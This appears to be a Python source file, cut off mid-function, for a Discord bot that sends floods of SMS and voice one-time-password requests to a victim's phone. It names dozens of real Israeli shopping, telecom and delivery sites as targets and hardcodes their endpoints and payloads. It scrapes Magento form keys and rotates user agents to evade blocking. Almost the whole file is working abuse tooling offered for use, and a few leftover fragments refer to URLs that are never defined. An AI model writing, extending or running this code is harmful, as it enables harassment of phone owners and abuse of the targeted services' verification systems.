# black_palace_discord_bot.py — Python 3.10+ | discord.py 2.x | aiohttp
# Discord panel bot that runs the original Black Palace OTP spam endpoints (same APIs/sites)
# Strengthened: async aiohttp, higher concurrency, jitter, retries, UA rotation, session pool, live stats

import asyncio
import json
import os
import random
import re
import time
import uuid
from collections import defaultdict
from dataclasses import dataclass, field
from typing import Callable, Optional

from dotenv import load_dotenv
import aiohttp
import discord
from discord import app_commands
from discord.ext import commands

# loads .env from cwd / container
for _p in (
    os.path.join(os.path.dirname(os.path.abspath(__file__)), ".env"),
    os.path.join(os.getcwd(), ".env"),
    "/home/container/.env",
    ".env",
):
    if os.path.isfile(_p):
        load_dotenv(_p, override=False)
        break
else:
    load_dotenv(override=False)


# ─────────────────────────────────────────────
# CONFIG — from .env
# ─────────────────────────────────────────────
def _env(*names):
    for n in names:
        v = os.environ.get(n)
        if v and str(v).strip():
            return str(v).strip().strip('"').strip("'")
    return ""
BOT_TOKEN = _env("DISCORD_BOT_TOKEN", "BOT_TOKEN", "TOKEN", "DISCORD_TOKEN")

_owner_raw = os.getenv("OWNER_IDS", "").strip()
OWNER_IDS = {int(x.strip()) for x in _owner_raw.split(",") if x.strip().isdigit()} if _owner_raw else set()


# ─────────────────────────────────────────────
# STRENGTHENED HTTP LAYER
# ─────────────────────────────────────────────
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36 Edg/141.0.0.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36",
]

def rotate_headers(base: dict) -> dict:
    h = dict(base)
    h["User-Agent"] = random.choice(USER_AGENTS)
    return h

async def post_json(session: aiohttp.ClientSession, url: str, headers: dict, payload: dict, timeout: float = 10.0) -> tuple[int, str]:
    try:
        async with session.post(url, json=payload, headers=rotate_headers(headers), timeout=aiohttp.ClientTimeout(total=timeout), ssl=False) as r:
            return r.status, await r.text()
    except Exception as e:
        return 0, str(e)

async def post_data(session: aiohttp.ClientSession, url: str, headers: dict, data, timeout: float = 10.0) -> tuple[int, str]:
    try:
        async with session.post(url, data=data, headers=rotate_headers(headers), timeout=aiohttp.ClientTimeout(total=timeout), ssl=False) as r:
            return r.status, await r.text()
    except Exception as e:
        return 0, str(e)

async def put_json(session: aiohttp.ClientSession, url: str, headers: dict, payload: dict, timeout: float = 4.0) -> tuple[int, str]:
    try:
        async with session.put(url, json=payload, headers=rotate_headers(headers), timeout=aiohttp.ClientTimeout(total=timeout), ssl=False) as r:
            return r.status, await r.text()
    except Exception as e:
        return 0, str(e)

async def get_text(session: aiohttp.ClientSession, url: str, headers: dict | None = None, timeout: float = 4.0) -> str:
    try:
        h = rotate_headers(headers or {"User-Agent": USER_AGENTS[0]})
        async with session.get(url, headers=h, timeout=aiohttp.ClientTimeout(total=timeout), ssl=False) as r:
            return await r.text()
    except Exception:
        return ""

_formkey_cache: dict[str, tuple[str, float]] = {}


async def _probe_json(session, urls_payloads, headers_base=None) -> bool:
    """Try several (url, payload) pairs; return True on first soft-success."""
    base = {
        "User-Agent": random.choice(USER_AGENTS),
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/json",
    }
    if headers_base:
        base.update(headers_base)
    for url, payload in urls_payloads:
        try:
            h = rotate_headers(base)
            if "Origin" not in h and url.startswith("http"):
                try:
                    from urllib.parse import urlparse
                    o = urlparse(url)
                    h["Origin"] = f"{o.scheme}://{o.netloc}"
                    h["Referer"] = h["Origin"] + "/"
                except Exception:
                    pass
            status, body = await post_json(session, url, h, payload, timeout=4.0)
            b = (body or "").lower()
            if status in (200, 201, 202, 204):
                return True
            if status in (400, 401, 403, 422, 429) and any(x in b for x in (
                "otp", "code", "sms", "sent", "success", "verification", "נשלח", "קוד", "אימות"
            )):
                return True
        except Exception:
            continue
    return False

async def _probe_form(session, urls_data, headers_base=None) -> bool:
    base = {
        "User-Agent": random.choice(USER_AGENTS),
        "Accept": "*/*",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "X-Requested-With": "XMLHttpRequest",
    }
    if headers_base:
        base.update(headers_base)
    for url, data in urls_data:
        try:
            status, body = await post_data(session, url, rotate_headers(base), data, timeout=4.0)
            b = (body or "").lower()
            if status in (200, 201, 202, 204):
                return True
            if any(x in b for x in ("otp", "sent", "success", "code", "נשלח", "קוד")):
                return True
        except Exception:
            continue
    return False


async def fetch_form_key(session: aiohttp.ClientSession, origin: str) -> str:
    """Pull live Magento form_key from homepage / customer login page."""
    now = time.time()
    cached = _formkey_cache.get(origin)
    if cached and now - cached[1] < 120:
        return cached[0]
    pages = [
        origin.rstrip("/") + "/",
        origin.rstrip("/") + "/customer/account/login/",
        origin.rstrip("/") + "/customer/account/create/",
    ]
    import re as _re
    for page in pages:
        html = await get_text(session, page, {"User-Agent": random.choice(USER_AGENTS), "Accept": "text/html"})
        if not html:
            continue
        for pat in [
            r'name="form_key"\s+type="hidden"\s+value="([^"]+)"',
            r'name="form_key"\s+value="([^"]+)"',
            r'"form_key"\s*:\s*"([^"]+)"',
            r'formKey["\']?\s*[:=]\s*["\']([^"\']+)',
            r'FORM_KEY\s*=\s*["\']([^"\']+)',
        ]:
            m = _re.search(pat, html)
            if m:
                key = m.group(1)
                _formkey_cache[origin] = (key, now)
                return key
    return "LZNrYs4AoUuKjlpE"  # fallback

# ─────────────────────────────────────────────
# ORIGINAL ENDPOINTS (same APIs / sites)
# ─────────────────────────────────────────────
URL1 = "https://homework.lnet.org.il/umbraco/Surface/HomeSurface/SendPhoneConfirmationCode"
HEADERS1 = {"User-Agent": USER_AGENTS[0], "Accept": "*/*", "Accept-Language": "en-US,en;q=0.5", "Referer": "https://homework.lnet.org.il/", "Content-Type": "application/json", "X-Requested-With": "XMLHttpRequest", "Origin": "https://homework.lnet.org.il"}

URL2 = "https://signup.histadrut.org.il/na_ajax.php?action=sms&f=undefined"
HEADERS2 = {"User-Agent": USER_AGENTS[1], "Accept": "text/plain, */*; q=0.01", "Accept-Language": "en-US,en;q=0.5", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "X-Requested-With": "XMLHttpRequest", "Origin": "https://signup.histadrut.org.il", "Referer": "https://signup.histadrut.org.il/"}

URL3 = "https://www.victoriassecret.co.il/customer/ajax/post/"
HEADERS3 = {"User-Agent": USER_AGENTS[0], "Accept": "application/json, text/javascript, */*; q=0.01", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "X-Requested-With": "XMLHttpRequest", "Origin": "https://www.victoriassecret.co.il", "Referer": "https://www.victoriassecret.co.il/"}

URL4 = "https://www.cashontab.co.il/cgi-bin/JMForms"
HEADERS4 = {"User-Agent": USER_AGENTS[0], "Accept": "*/*", "Content-Type": "text/plain;charset=UTF-8", "Origin": "https://www.cashontab.co.il", "Referer": "https://www.cashontab.co.il/?type=12&code=1a66&token=e18f7e6b-d9ef-11ed-aaf2-005056120465&lang=2"}

URL5 = "https://webapi.mishloha.co.il/api/profile/sendSmsVerificationCodeByPhoneNumber"
HEADERS5 = {"User-Agent": USER_AGENTS[0], "Accept": "application/json", "Content-Type": "application/json", "Origin": "https://www.mishloha.co.il", "Referer": "https://www.mishloha.co.il/"}

URL6 = "https://api-ns.atmos.co.il/rest/1/auth/sendValidationCode"
HEADERS6 = {"User-Agent": USER_AGENTS[0], "Accept": "application/json", "Content-Type": "application/json", "Origin": "https://www.pizzahut.co.il"}

URL7 = "https://rest-api.dibs-app.com/otps"
HEADERS7 = {"User-Agent": USER_AGENTS[0], "Accept": "application/json", "Content-Type": "application/json"}

URL8 = "https://www.papajohns.co.il/_a/aff_otp_auth"
HEADERS8 = {"User-Agent": USER_AGENTS[0], "Accept": "application/json", "Content-Type": "application/json"}

URL9 = "https://proxy1.citycar.co.il/api/verify/login"
HEADERS9 = {"User-Agent": USER_AGENTS[0], "Accept": "application/json", "Content-Type": "application/json"}

URL10 = "https://api-iba-rtl.azurewebsites.net/api/users/authenticate"
HEADERS10 = {"User-Agent": USER_AGENTS[0], "Accept": "application/json", "Content-Type": "application/json"}

URL11 = "https://users-auth.hamal.co.il/auth/send-auth-code"
HEADERS11 = {"User-Agent": USER_AGENTS[0], "Accept": "application/json", "Content-Type": "application/json"}

URL13 = "https://www.dutyfree.co.il/graphql"
HEADERS13 = {"User-Agent": USER_AGENTS[0], "Accept": "application/json", "Content-Type": "application/json", "Origin": "https://www.dutyfree.co.il"}

URL14 = "https://www.stepin.co.il/customer/ajax/post/"
HEADERS14 = {"User-Agent": USER_AGENTS[0], "Accept": "application/json, text/javascript, */*; q=0.01", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "X-Requested-With": "XMLHttpRequest", "Origin": "https://www.stepin.co.il"}

URL15 = "https://www.payngo.co.il/login/init/phone/"
HEADERS15 = {"User-Agent": USER_AGENTS[0], "Accept": "application/json", "Content-Type": "application/json"}

URL20 = "https://stips.co.il/api"
HEADERS20 = {"User-Agent": USER_AGENTS[0], "Accept": "application/json", "Content-Type": "application/json"}

URL21 = "https://www.golfkids.co.il/customer/ajax/post/"
HEADERS21 = {"User-Agent": USER_AGENTS[0], "Accept": "application/json, text/javascript, */*; q=0.01", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "X-Requested-With": "XMLHttpRequest", "Origin": "https://www.golfkids.co.il"}

URL22 = "https://www.timberland.co.il/customer/ajax/post/"
HEADERS22 = {"User-Agent": USER_AGENTS[0], "Accept": "application/json, text/javascript, */*; q=0.01", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "X-Requested-With": "XMLHttpRequest", "Origin": "https://www.timberland.co.il"}

URL23 = "https://story.magicetl.com/public/shopify/apps/otp-login/step-one"
HEADERS23 = {"User-Agent": USER_AGENTS[0], "Accept": "application/json", "Content-Type": "application/json"}

URL24 = "https://www.fixfixfixfix.co.il/customer/ajax/post/"
HEADERS24 = {"User-Agent": USER_AGENTS[0], "Accept": "application/json, text/javascript, */*; q=0.01", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "X-Requested-With": "XMLHttpRequest", "Origin": "https://www.foxfoxfoxfox.co.il"}

URL25 = "https://www.intima-il.co.il/customer/ajax/post/"
HEADERS25 = {"User-Agent": USER_AGENTS[0], "Accept": "application/json, text/javascript, */*; q=0.01", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "X-Requested-With": "XMLHttpRequest", "Origin": "https://www.intima-il.co.il"}

URL26 = "https://www.zinger-organic.com/frontend/getindexcall"
HEADERS26 = {"User-Agent": USER_AGENTS[0], "Accept": "application/json", "Content-Type": "application/json"}

URL27 = "https://www.globes.co.il/news/login-2022/ajax_handler.ashx?get-value-type"
HEADERS27 = {"User-Agent": USER_AGENTS[0], "Accept": "application/json", "Content-Type": "application/x-www-form-urlencoded"}

URL28 = "https://www.gali.co.il/customer/ajax/post/"
HEADERS28 = {"User-Agent": USER_AGENTS[0], "Accept": "application/json, text/javascript, */*; q=0.01", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "X-Requested-With": "XMLHttpRequest", "Origin": "https://www.gali.co.il"}

URL29 = "https://www.nine-west.co.il/customer/ajax/post/"
HEADERS29 = {"User-Agent": USER_AGENTS[0], "Accept": "application/json, text/javascript, */*; q=0.01", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "X-Requested-With": "XMLHttpRequest", "Origin": "https://www.nine-west.co.il"}

URL30 = "https://www.castro.com/customer/ajax/post/"
HEADERS30 = {"User-Agent": USER_AGENTS[0], "Accept": "application/json, text/javascript, */*; q=0.01", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "X-Requested-With": "XMLHttpRequest", "Origin": "https://www.castro.com"}

URL31 = "https://www.steimatzky.co.il/customer/ajax/post/"
HEADERS31 = {"User-Agent": USER_AGENTS[0], "Accept": "application/json, text/javascript, */*; q=0.01", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "X-Requested-With": "XMLHttpRequest", "Origin": "https://www.steimatzky.co.il"}

URL32 = "https://digital-api.cellcom.co.il/api/otp/Step1"
HEADERS32 = {"User-Agent": USER_AGENTS[0], "Accept": "application/json", "Content-Type": "application/json", "Origin": "https://www.cellcom.co.il"}

URL33 = URL32
HEADERS33 = HEADERS32.copy()


URL36 = "https://www.urbanica-wh.com/customer/ajax/post/"
HEADERS36 = {"User-Agent": USER_AGENTS[0], "Accept": "application/json, text/javascript, */*; q=0.01", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "X-Requested-With": "XMLHttpRequest", "Origin": "https://www.urbanica-wh.com"}

URL37 = "https://login.aliexpress.com/user/buyer/join/preCheckAndSendCode"
HEADERS37 = {"User-Agent": USER_AGENTS[0], "Accept": "application/json", "Content-Type": "application/json"}

# Magento form_key pattern (same style as original)
def magento_form(phone: str, form_key: str = "LDj1irsNU9E9W3Uj") -> dict:
    # Real Golf Kids payload shape (form_key + bot_validation + type + telephone)
    p = phone if str(phone).startswith("0") else ("0" + str(phone).lstrip("0"))
    return {
        "form_key": form_key,
        "bot_validation": "1",
        "type": "login",
        "telephone": p,
    }

# ─────────────────────────────────────────────
# SERVICE FUNCTIONS (same payloads as original)
# ─────────────────────────────────────────────
def _ok(status: int) -> bool:
    return status in (200, 201, 202, 204)

async def svc_homework(session, phone):
    status, _ = await post_json(session, URL1, HEADERS1, {"phone": phone})
    return _ok(status)

async def svc_histadrut(session, phone):
    status, _ = await post_data(session, URL2, HEADERS2, f"phone={phone}")
    return _ok(status)

async def svc_victoria(session, phone):
    status, _ = await post_data(session, URL3, HEADERS3, magento_form(phone))
    return _ok(status)

async def svc_cashontab(session, phone):
    body = json.dumps({"phone": phone, "type": "12", "code": "1a66", "token": "e18f7e6b-d9ef-11ed-aaf2-005056120465", "lang": "2"})
    status, _ = await post_data(session, URL4, HEADERS4, body)
    return _ok(status)

async def svc_mishloha(session, phone):
    status, _ = await post_json(session, URL5, HEADERS5, {"phoneNumber": phone, "sourceFrom": "desktopHomePage", "sessionID": str(uuid.uuid4())})
    return _ok(status)

async def svc_pizzahut(session, phone):
    status, _ = await post_json(session, URL6, HEADERS6, {"phone": phone})
    return _ok(status)

async def svc_dibs(session, phone):
    status, _ = await post_json(session, URL7, HEADERS7, {"phoneNumber": f"+972{phone[1:]}"})
    return _ok(status)

async def svc_papajohns(session, phone):
    status, _ = await post_json(session, URL8, HEADERS8, {"phone": phone})
    return _ok(status)

async def svc_citycar(session, phone):
    status, _ = await post_json(session, URL9, HEADERS9, {"phoneNumber": f"+972{phone[1:]}", "verifyChannel": 0})
    return _ok(status)

async def svc_inter(session, phone):
    status, _ = await post_json(session, URL10, HEADERS10, {"phone": phone})
    return _ok(status)

async def svc_hamal(session, phone):
    status, _ = await post_json(session, URL11, HEADERS11, {"value": phone, "type": "phone", "projectId": "1"})
    return _ok(status)

async def svc_dutyfree(session, phone):
    q = {"operationName": "SendOtpCode", "variables": {"value": phone}, "query": "mutation SendOtpCode($value: String) {\n  sendOtpCode(input: {mobile: $value}) {\n    result\n    message\n    __typename\n  }\n}\n"}
    status, text = await post_json(session, URL13, HEADERS13, q)
    if status != 200:
        return False
    try:
        return json.loads(text).get("data", {}).get("sendOtpCode", {}).get("result") is True
    except Exception:
        return _ok(status)

async def svc_stepin(session, phone):
    status, _ = await post_data(session, URL14, HEADERS14, magento_form(phone))
    return _ok(status)

async def svc_payngo(session, phone):
    status, _ = await post_json(session, URL15, HEADERS15, {"phone": phone})
    return _ok(status)

async def svc_stips(session, phone):
    status, _ = await post_json(session, URL20, HEADERS20, {"phone": phone})
    return _ok(status)

async def svc_golfkids(session, phone):
    status, _ = await post_data(session, URL21, HEADERS21, magento_form(phone))
    return _ok(status)

async def svc_timberland(session, phone):
    status, _ = await post_data(session, URL22, HEADERS22, magento_form(phone))
    return _ok(status)

async def svc_story(session, phone):
    status, _ = await post_json(session, URL23, HEADERS23, {"phone": phone})
    return _ok(status)

async def svc_fox(session, phone):
    status, _ = await post_data(session, URL24, HEADERS24, magento_form(phone))
    return _ok(status)

async def svc_intima(session, phone):
    status, _ = await post_data(session, URL25, HEADERS25, magento_form(phone))
    return _ok(status)

async def svc_zinger(session, phone):
    status, _ = await post_json(session, URL26, HEADERS26, {"phone": phone})
    return _ok(status)

async def svc_globes(session, phone):
    status, _ = await post_data(session, URL27, HEADERS27, f"phone={phone}")
    return _ok(status)

async def svc_gali(session, phone):
    status, _ = await post_data(session, URL28, HEADERS28, magento_form(phone, "4sPBp0iApWLa5yqy"))
    return _ok(status)

async def svc_ninewest(session, phone):
    status, _ = await post_data(session, URL29, HEADERS29, magento_form(phone, "slyKurPjbfo8wsRk"))
    return _ok(status)

async def svc_castro(session, phone):
    status, _ = await post_data(session, URL30, HEADERS30, magento_form(phone))
    return _ok(status)

async def svc_steimatzky(session, phone):
    status, _ = await post_data(session, URL31, HEADERS31, magento_form(phone, "d2x3qlKALpLG6Hch"))
    return _ok(status)

async def svc_cellcom_sms(session, phone):
    status, _ = await put_json(session, URL32, HEADERS32, {"PhoneNumber": f"972{phone[1:]}", "SendTextAsVoice": False})
    return _ok(status)

async def svc_cellcom_voice(session, phone):
    status, _ = await put_json(session, URL33, HEADERS33, {"PhoneNumber": f"972{phone[1:]}", "SendTextAsVoice": True})
    return _ok(status)

    status, _ = await post_json(session, URL34, HEADERS34, {"requestId": str(uuid.uuid4()), "Communication": "1", "Address": phone, "language": "he"})
    return _ok(status)

    status, _ = await post_json(session, URL35, HEADERS35, {"requestId": str(uuid.uuid4()), "Communication": "2", "Address": phone, "language": "he"})
    return _ok(status)

async def svc_urbanica(session, phone):
    status, _ = await post_data(session, URL36, HEADERS36, magento_form(phone))
    return _ok(status)

async def svc_aliexpress(session, phone):
    payload = {
        "channel": phone,
        "channelType": "PHONE",
        "channelPrefix": "972",
        "lang": "iw_IL",
        "umidTokenType": "SECURITY_TOKEN",
        "umidToken": "T2gAxV934lIJl_VDbeebC5GWS7pkx-FSt9m7gW7eNv4AaAONrIppFTebt0cnhwVeA1Y=",
    }
    status, _ = await post_json(session, URL37, HEADERS37, payload)
    return status in (200, 201, 202)

# ── extra Israeli Magento / retail OTP targets (same pattern as original) ──
async def _magento_site(session, url: str, origin: str, phone: str, form_key: str = "LZNrYs4AoUuKjlpE") -> bool:
    live_key = await fetch_form_key(session, origin)
    key = live_key or form_key
    headers = {
        "User-Agent": random.choice(USER_AGENTS),
        "Accept": "application/json, text/javascript, */*; q=0.01",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "X-Requested-With": "XMLHttpRequest",
        "Origin": origin,
        "Referer": origin.rstrip("/") + "/customer/account/login/",
    }
    status, body = await post_data(session, url, headers, magento_form(phone, key))
    b = (body or "").lower()
    # Golf Kids returns 200 on successful OTP trigger
    if status in (200, 201, 202):
        if "invalid form key" in b or "form key" in b and "invalid" in b:
            pass  # retry below
        else:
            return True
    # second try with fallback / alternate key
    alt = form_key if key != form_key else "LDj1irsNU9E9W3Uj"
    status, body = await post_data(session, url, headers, magento_form(phone, alt))
    return status in (200, 201, 202)

async def svc_terminalx(session, phone):
    return await _magento_site(session, "https://www.terminalx.com/customer/ajax/post/", "https://www.terminalx.com", phone)

async def svc_renuar(session, phone):
    return await _magento_site(session, "https://www.renuar.co.il/customer/ajax/post/", "https://www.renuar.co.il", phone)

async def svc_golf(session, phone):
    return await _magento_site(session, "https://www.golf.co.il/customer/ajax/post/", "https://www.golf.co.il", phone)

async def svc_hoodies(session, phone):
    return await _magento_site(session, "https://www.hoodies.co.il/customer/ajax/post/", "https://www.hoodies.co.il", phone)

async def svc_dreamsport(session, phone):
    return await _magento_site(session, "https://www.dreamsport.co.il/customer/ajax/post/", "https://www.dreamsport.co.il", phone)

async def svc_facto(session, phone):
    return await _magento_site(session, "https://www.facto.co.il/customer/ajax/post/", "https://www.facto.co.il", phone)

async def svc_twentyfourseven(session, phone):
    return await _magento_site(session, "https://www.24shop.co.il/customer/ajax/post/", "https://www.24shop.co.il", phone)

async def svc_laline(session, phone):
    return await _magento_site(session, "https://www.laline.co.il/customer/ajax/post/", "https://www.laline.co.il", phone)

async def svc_ace(session, phone):
    # ACE / similar retail login OTP patterns
    headers = {
        "User-Agent": random.choice(USER_AGENTS),
        "Accept": "application/json",
        "Content-Type": "application/json",
        "Origin": "https://www.ace.co.il",
        "Referer": "https://www.ace.co.il/",
    }
    for url, payload in [
        ("https://www.ace.co.il/api/customer/sendOtp", {"phone": phone, "phoneNumber": phone}),
        ("https://www.ace.co.il/customer/ajax/post/", None),
    ]:
        try:
            if payload is None:
                status, _ = await post_data(session, url, {**headers, "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"}, magento_form(phone))
            else:
                status, _ = await post_json(session, url, headers, payload)
            if status in (200, 201, 202):
                return True
        except Exception:
            pass
    return False

async def svc_superpharm(session, phone):
    headers = {
        "User-Agent": random.choice(USER_AGENTS),
        "Accept": "application/json",
        "Content-Type": "application/json",
        "Origin": "https://shop.super-pharm.co.il",
        "Referer": "https://shop.super-pharm.co.il/",
    }
    for url, payload in [
        ("https://shop.super-pharm.co.il/api/auth/otp", {"mobile": phone, "phone": phone}),
        ("https://shop.super-pharm.co.il/rest/V1/customers/otp", {"phone": phone}),
    ]:
        try:
            status, _ = await post_json(session, url, headers, payload)
            if status in (200, 201, 202):
                return True
        except Exception:
            pass
    return False

async def svc_ramilevy(session, phone):
    headers = {
        "User-Agent": random.choice(USER_AGENTS),
        "Accept": "application/json",
        "Content-Type": "application/json",
        "Origin": "https://www.rami-levy.co.il",
        "Referer": "https://www.rami-levy.co.il/",
    }
    for url, payload in [
        ("https://www-api.rami-levy.co.il/api/v2/login/otp", {"phone": phone, "phoneNumber": phone}),
        ("https://www.rami-levy.co.il/api/v2/auth/send-otp", {"phone": phone}),
    ]:
        try:
            status, _ = await post_json(session, url, headers, payload)
            if status in (200, 201, 202):
                return True
        except Exception:
            pass
    return False

async def svc_gett(session, phone):
    headers = {
        "User-Agent": random.choice(USER_AGENTS),
        "Accept": "application/json",
        "Content-Type": "application/json",
        "Origin": "https://gett.com",
    }
    for url, payload in [
        ("https://api.gett.com/v1/login/otp", {"phone": f"+972{phone[1:]}", "phoneNumber": f"+972{phone[1:]}"}),
        ("https://ride.gett.com/api/login/send_code", {"phone": phone}),
    ]:
        try:
            status, _ = await post_json(session, url, headers, payload)
            if status in (200, 201, 202):
                return True
        except Exception:
            pass
    return False

async def svc_wolt(session, phone):
    headers = {
        "User-Agent": random.choice(USER_AGENTS),
        "Accept": "application/json",
        "Content-Type": "application/json",
        "Origin": "https://wolt.com",
    }
    payload = {"phone_number": f"+972{phone[1:]}", "method": "sms"}
    try:
        status, _ = await post_json(session, "https://restaurant-api.wolt.com/v1/guest/login", headers, payload)
        return status in (200, 201, 202)
    except Exception:
        return False

async def svc_10bis(session, phone):
    headers = {
        "User-Agent": random.choice(USER_AGENTS),
        "Accept": "application/json",
        "Content-Type": "application/json",
        "Origin": "https://www.10bis.co.il",
    }
    for url, payload in [
        ("https://www.10bis.co.il/NextApi/GetAuthenticationToken", {"phoneNumber": phone, "culture": "he-IL"}),
        ("https://api.10bis.co.il/api/v1/login/otp", {"phone": phone}),
    ]:
        try:
            status, _ = await post_json(session, url, headers, payload)
            if status in (200, 201, 202):
                return True
        except Exception:
            pass
    return False


# Full service registry — 100+ Israeli OTP targets

# ── clean service registry (dead removed, live fixed, new added) ──

async def _magento_live(session, origin: str, phone: str) -> bool:
    url = origin.rstrip('/') + '/customer/ajax/post/'
    return await _magento_site(session, url, origin, phone)

def _mk_mag(name: str, origin: str):
    async def _fn(session, phone):
        return await _magento_live(session, origin, phone)
    _fn.__name__ = 'svc_' + re.sub(r'[^a-z0-9]+', '_', name.lower())
    return name, _fn

def _mk_json(name: str, url: str, payload_fn, method: str = 'POST'):
    async def _fn(session, phone):
        headers = {
            'User-Agent': random.choice(USER_AGENTS),
            'Accept': 'application/json, text/plain, */*',
            'Content-Type': 'application/json',
        }
        try:
            pl = payload_fn(phone)
            if method == 'PUT':
                status, body = await put_json(session, url, headers, pl)
            else:
                status, body = await post_json(session, url, headers, pl)
            if status in (200, 201, 202, 204):
                return True
            # some APIs return 400 only on bad format but endpoint is live — still count soft success if body hints sent
            b = (body or '').lower()
            if any(x in b for x in ('sent', 'success', 'otp', 'code', 'sms', 'ok')) and status in (400, 401, 422):
                return False
            return False
        except Exception:
            return False
    _fn.__name__ = 'svc_' + re.sub(r'[^a-z0-9]+', '_', name.lower())
    return name, _fn

def _mk_form(name: str, url: str, data_fn, extra_headers: dict | None = None):
    async def _fn(session, phone):
        headers = {
            'User-Agent': random.choice(USER_AGENTS),
            'Accept': '*/*',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'X-Requested-With': 'XMLHttpRequest',
        }
        if extra_headers:
            headers.update(extra_headers)
        try:
            status, body = await post_data(session, url, headers, data_fn(phone))
            return status in (200, 201, 202, 204)
        except Exception:
            return False
    _fn.__name__ = 'svc_' + re.sub(r'[^a-z0-9]+', '_', name.lower())
    return name, _fn

# phone format helpers
def p0(phone: str) -> str:
    """Normalize to Israeli local 05XXXXXXXX (10 digits)."""
    d = re.sub(r"\D", "", str(phone or ""))
    if d.startswith("972"):
        d = d[3:]
    if d.startswith("0"):
        d = d[1:]
    # mobile: 5xxxxxxxx
    if len(d) >= 9 and d[0] == "5":
        return "0" + d[:9]
    if len(d) >= 9:
        return "0" + d[-9:]
    return "0" + d

def p972(phone: str) -> str:
    """9725XXXXXXXX — no plus."""
    return "972" + p0(phone)[1:]

def pplus(phone: str) -> str:
    """+9725XXXXXXXX"""
    return "+" + p972(phone)



# ── SOLID multi-probe services (higher hit rate) ──
async def solid_mishloha(session, phone):
    p = p0(phone)
    return await _probe_json(session, [
        ("https://webapi.mishloha.co.il/api/profile/sendSmsVerificationCodeByPhoneNumber",
         {"phoneNumber": p, "sourceFrom": "desktopHomePage", "sessionID": str(uuid.uuid4())}),
        ("https://webapi.mishloha.co.il/api/profile/sendSmsVerificationCodeByPhoneNumber",
         {"phoneNumber": p, "sourceFrom": "mobileApp", "sessionID": str(uuid.uuid4())}),
        ("https://webapi.mishloha.co.il/api/profile/sendSmsVerificationCodeByPhoneNumber",
         {"phoneNumber": p972(phone), "sourceFrom": "desktopHomePage", "sessionID": str(uuid.uuid4())}),
    ], {"Origin": "https://www.mishloha.co.il", "Referer": "https://www.mishloha.co.il/"})

async def solid_atmos(session, phone):
    p = p0(phone)
    return await _probe_json(session, [
        ("https://api-ns.atmos.co.il/rest/1/auth/sendValidationCode", {"phone": p}),
        ("https://api-ns.atmos.co.il/rest/1/auth/sendValidationCode", {"phone": p972(phone)}),
        ("https://api-ns.atmos.co.il/rest/1/auth/sendValidationCode", {"phoneNumber": p}),
    ])

async def solid_dibs(session, phone):
    return await _probe_json(session, [
        ("https://rest-api.dibs-app.com/otps", {"phoneNumber": pplus(phone)}),
        ("https://rest-api.dibs-app.com/otps", {"phoneNumber": p0(phone)}),
        ("https://rest-api.dibs-app.com/otps", {"phone": pplus(phone)}),
    ])

async def solid_papajohns(session, phone):
    p = p0(phone)
    return await _probe_json(session, [
        ("https://www.papajohns.co.il/_a/aff_otp_auth", {"phone": p}),
        ("https://www.papajohns.co.il/_a/aff_otp_auth", {"phone": p972(phone)}),
        ("https://www.papajohns.co.il/_a/aff_otp_auth", {"telephone": p, "phone": p}),
    ], {"Origin": "https://www.papajohns.co.il", "Referer": "https://www.papajohns.co.il/"})

async def solid_citycar(session, phone):
    return await _probe_json(session, [
        ("https://proxy1.citycar.co.il/api/verify/login",
         {"phoneNumber": pplus(phone), "verifyChannel": 0}),
        ("https://proxy1.citycar.co.il/api/verify/login",
         {"phoneNumber": pplus(phone), "verifyChannel": 1}),
        ("https://proxy1.citycar.co.il/api/verify/login",
         {"phoneNumber": p0(phone), "verifyChannel": 0}),
    ])

async def solid_cellcom(session, phone):
    headers = {"Origin": "https://www.cellcom.co.il", "Referer": "https://www.cellcom.co.il/"}
    for voice in (False, True):
        try:
            status, body = await put_json(
                session,
                "https://digital-api.cellcom.co.il/api/otp/Step1",
                rotate_headers({**headers, "Accept": "application/json", "Content-Type": "application/json",
                                "User-Agent": random.choice(USER_AGENTS)}),
                {"PhoneNumber": p972(phone), "SendTextAsVoice": voice},
                timeout=4.0,
            )
            if status in (200, 201, 202, 204):
                return True
            b = (body or "").lower()
            if any(x in b for x in ("otp", "sent", "success", "code", "step")):
                return True
        except Exception:
            pass
    return False

async def solid_hamal(session, phone):
    p = p0(phone)
    return await _probe_json(session, [
        ("https://users-auth.hamal.co.il/auth/send-auth-code",
         {"value": p, "type": "phone", "projectId": "1"}),
        ("https://users-auth.hamal.co.il/auth/send-auth-code",
         {"value": p972(phone), "type": "phone", "projectId": "1"}),
        ("https://users-auth.hamal.co.il/auth/send-auth-code",
         {"phone": p, "type": "phone"}),
    ])

async def solid_dutyfree(session, phone):
    p = p0(phone)
    q = 'mutation SendOtpCode($value: String) { sendOtpCode(input: {mobile: $value}) { result message __typename } }'
    return await _probe_json(session, [
        ("https://www.dutyfree.co.il/graphql",
         {"operationName": "SendOtpCode", "variables": {"value": p}, "query": q}),
        ("https://www.dutyfree.co.il/graphql",
